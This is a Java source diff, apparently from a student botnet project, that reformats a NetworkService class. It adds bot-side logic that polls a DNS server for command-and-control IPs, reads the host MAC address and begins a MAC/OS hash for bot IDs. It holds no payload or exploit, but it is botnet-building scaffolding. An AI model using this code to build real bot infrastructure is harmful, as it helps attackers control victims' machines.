@@ -4,150 +4,194 @@ import java.lang.reflect.Type;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
+import java.net.UnknownHostException;
 import java.nio.channels.NetworkChannel;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.Iterator;
 import java.util.List;
 
+import org.apache.commons.codec.digest.DigestUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 
 import com.google.common.reflect.TypeToken;
 
 import cs.sii.config.bot.Engine;
+import cs.sii.dao.Bot;
 import cs.sii.model.Conversions;
 import cs.sii.model.IP;
 import cs.sii.model.SyncIpList;
 
-
-
-
 @Service("NetworkService")
 public class NetworkService {
-	
-@Autowired
-private Engine engineBot;
 
-//Ip dei command e conquer
-@Autowired
-private SyncIpList commandConquerIps;
+	@Autowired
+	private Engine engineBot;
 
-//Ip dei bot
-@Autowired
-private SyncIpList botIps;
+	// Ip dei command e conquer
+	@Autowired
+	private SyncIpList commandConquerIps;
 
-@Autowired
-private AsyncRequest asyncRequest;
+	// Ip dei bot
+	@Autowired
+	private SyncIpList botIps;
 
-private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
+	@Autowired
+	private AsyncRequest asyncRequest;
 
-//Ip della mia macchina
-private IP ip;
-	
-	
-public NetworkService(){}
-	
-//Selezione del IP non necessario
-public void selectIp() {
+	private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
+	private static final String MAC_REGEX = "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";
 
-	ArrayList<String> ips = getAllIpAddresses();
-	if (ips == null || ips.size()<1) {
-		System.err.println("Non sei connesso a nessuna rete");
+	// Ip della mia macchina
+	private IP ip;
 
-	}else{
-		if(ips.size()>0)
-			for (Iterator<String> iterator = ips.iterator(); iterator.hasNext();) {
-				String string = (String) iterator.next();
-				//TODO da MODIFICARE
-				if(string.startsWith("10.192."))
-					this.ip= new IP(string);
-			}
-	}
-}
-
-public ArrayList<String> getAllIpAddresses() {
-
-	ArrayList<String> ips = new ArrayList<>();
-
-	try {
-		Enumeration<?> e = NetworkInterface.getNetworkInterfaces();
-		while (e.hasMoreElements()) {
-			NetworkInterface n = (NetworkInterface) e.nextElement();
-			Enumeration<?> ee = n.getInetAddresses();
-			while (ee.hasMoreElements()) {
-				InetAddress i = (InetAddress) ee.nextElement();
-				if (i.getHostAddress().matches(IP_REGEX)) {
-					ips.add(i.getHostAddress());
-				}
-			}
-		}
-	} catch (SocketException e) {
-		e.printStackTrace();
-		return null;
+	public NetworkService() {
 	}
 
-	return ips;
-}
+	// Selezione del IP non necessario perchè non passiamo per arceri
+	private void selectIp() {
+		ArrayList<String> ips = getAllIpAddresses();
+		if (ips == null || ips.size() < 1) {
+			System.err.println("Non sei connesso a nessuna rete");
+		} else {
+			if (ips.size() > 0)
+				for (Iterator<String> iterator = ips.iterator(); iterator.hasNext();) {
+					String string = (String) iterator.next();
+					// TODO da MODIFICARE
+					if (string.startsWith("10.192."))
+						this.ip = new IP(string);
+				}
+		}
+	}
 
-@SuppressWarnings("unchecked")
-public boolean firstConnectToMockServerDns() {
+	private ArrayList<String> getAllIpAddresses() {
 
-	String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
-	IP result = new IP("");
-	Integer counter = 0;
-	
-	while (counter <= AsyncRequest.REQNUMBER) {
+		ArrayList<String> ips = new ArrayList<>();
+
 		try {
-			System.out.println("URL: " + url);
-			System.out.println("Il mio IP: " + ip);
-			result = asyncRequest.getIpCommandAndControlFromDnsServer(url);
-			
-			System.out.println("Ip tornato "+result);
-			//List<String> ips = Conversions.fromJson(result, type);
-			/*
-			ArrayList<IP> iplist = new ArrayList<>();
-			if (ips != null && ips.size() != 0) {
-				for (String ip : ips) {
-					iplist.add(new IP(ip));
+			Enumeration<?> e = NetworkInterface.getNetworkInterfaces();
+			while (e.hasMoreElements()) {
+				NetworkInterface n = (NetworkInterface) e.nextElement();
+				Enumeration<?> ee = n.getInetAddresses();
+				while (ee.hasMoreElements()) {
+					InetAddress i = (InetAddress) ee.nextElement();
+					if (i.getHostAddress().matches(IP_REGEX)) {
+						ips.add(i.getHostAddress());
+					}
 				}
 			}
-			*/
-			//commandConquerIps.setAllIp((List<IP>) iplist.clone());
-			
-			commandConquerIps.addIP(result);
-//
-			System.out.println("Numero di IP ottenuti: " + commandConquerIps.getIPList().size());
-			commandConquerIps.getIPList().forEach(ip -> System.out.println(ip));
-
-			return Boolean.TRUE;
-		} catch (Exception ex) {
-			System.err.println("Errore durante la richiesta di IP\n" + ex);
-			counter++;
+		} catch (SocketException e) {
+			e.printStackTrace();
+			return null;
 		}
 
+		return ips;
+	}
+
+	private String getMac() {
+
+		InetAddress ip;
+		StringBuilder sb = new StringBuilder();
 		try {
-			Thread.sleep(250);
-		} catch (InterruptedException e) {
+			ip = InetAddress.getLocalHost();
+			System.out.println("Current IP address : " + ip.getHostAddress());
+
+			NetworkInterface network = NetworkInterface.getByInetAddress(ip);
+			byte[] mac = network.getHardwareAddress();
+			System.out.print("Current MAC address : ");
+
+			for (int i = 0; i < mac.length; i++) {
+				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
+			}
+			System.out.println(sb.toString());
+
+		} catch (UnknownHostException e) {
+			e.printStackTrace();
+		} catch (SocketException e) {
 			e.printStackTrace();
 		}
+		return sb.toString();
 	}
 
-	return Boolean.FALSE;
-}
+	@SuppressWarnings("unchecked")
+	public boolean firstConnectToMockServerDns() {
 
+		String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
+		IP result = new IP("");
+		Integer counter = 0;
 
-public boolean updateBotNetwork(){
-return true;
-}
+		while (counter <= AsyncRequest.REQNUMBER) {
+			try {
+				System.out.println("URL: " + url);
+				System.out.println("Il mio IP: " + ip);
+				result = asyncRequest.getIpCommandAndControlFromDnsServer(url);
 
-public SyncIpList getCommandConquerIps() {
-	return commandConquerIps;
-}
+				System.out.println("Ip tornato " + result);
+				// List<String> ips = Conversions.fromJson(result, type);
+				/*
+				 * ArrayList<IP> iplist = new ArrayList<>(); if (ips != null &&
+				 * ips.size() != 0) { for (String ip : ips) { iplist.add(new
+				 * IP(ip)); } }
+				 */
+				// commandConquerIps.setAllIp((List<IP>) iplist.clone());
 
-public SyncIpList getBotIps() {
-	return botIps;
-}
+				commandConquerIps.addIP(result);
+				//
+				System.out.println("Numero di IP ottenuti: " + commandConquerIps.getIPList().size());
+				commandConquerIps.getIPList().forEach(ip -> System.out.println(ip));
 
+				return Boolean.TRUE;
+			} catch (Exception ex) {
+				System.err.println("Errore durante la richiesta di IP\n" + ex);
+				counter++;
+			}
+
+			try {
+				Thread.sleep(250);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
+			}
+		}
+
+		return Boolean.FALSE;
+	}
+
+	public Bot generateID(){
+		
+		//TODO
+		//prendi il mac
+		String mac = getMac();
+		
+		//prendi il sistema operativo
+		String os = System.getProperty("os.name");
+		//aggiungi nonce time.millis
+	 	long milli = System.currentTimeMillis();
+		
+		//genera hash
+	 	byte[] hash = DigestUtils.sha256(mac + milli + os);
+	 	
+	 	//salva hash su properties;
+	 	
+	 	
+		//genera Bot
+		return new Bot();
+		
+	}
+	
+	
+	
+	
+	public boolean updateBotNetwork() {
+		return true;
+	}
+
+	public SyncIpList getCommandConquerIps() {
+		return commandConquerIps;
+	}
+
+	public SyncIpList getBotIps() {
+		return botIps;
+	}
 
 }
